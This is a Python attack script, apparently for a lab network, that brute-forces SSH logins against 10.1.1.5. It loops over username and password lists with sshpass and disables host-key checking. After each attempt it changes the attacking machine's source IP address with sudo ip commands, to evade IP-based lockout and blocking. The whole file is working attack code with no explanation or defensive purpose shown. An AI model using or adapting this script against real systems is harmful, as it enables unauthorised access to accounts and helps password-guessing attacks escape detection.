import subprocess

outputlist = []

count = 0
ip_index = 0
passwd_index = 0

global target_IP
target_IP = "10.1.1.5"
global host_IP
host_IP = "10.1.1."
global network_Interface
network_Interface = "enp0s8"

def make_IP_List():
    global ips
    ips = []
    for i in range(52, 254):
        ips.append(i)

def get_Passwords():
    global passwds
    passwds = []
    with open('./passwordfile.txt', 'r') as file1:
        passwds = [line.strip() for line in file1]

def get_Users():
    global users
    users = []
    with open('./userfile.txt', 'r') as file1:
        users = [line.strip() for line in file1]

def run_Attack():
    ip_index = 0
    passwd_index = 0
    while passwd_index < len(passwds):
        for user in users:
            for ps in passwds:
                print(user,':', ps)
                subprocess.call(['sshpass','-p', ps,'ssh','-o','stricthostkeychecking=no', user + '@' + target_IP])
                ip = ips[ip_index]
                old_ip = ip - 1
                subprocess.call(['sudo', 'ip', 'addr', 'add', host_IP + str(ip) + '/24', 'dev', network_Interface])
                subprocess.call(['sudo', 'ip', 'addr', 'delete', host_IP + str(old_ip) + '/24', 'dev', network_Interface])
                ip_index += 1
                if ip_index >= len(ips):
                    ip_index = 0
                passwd_index += 1
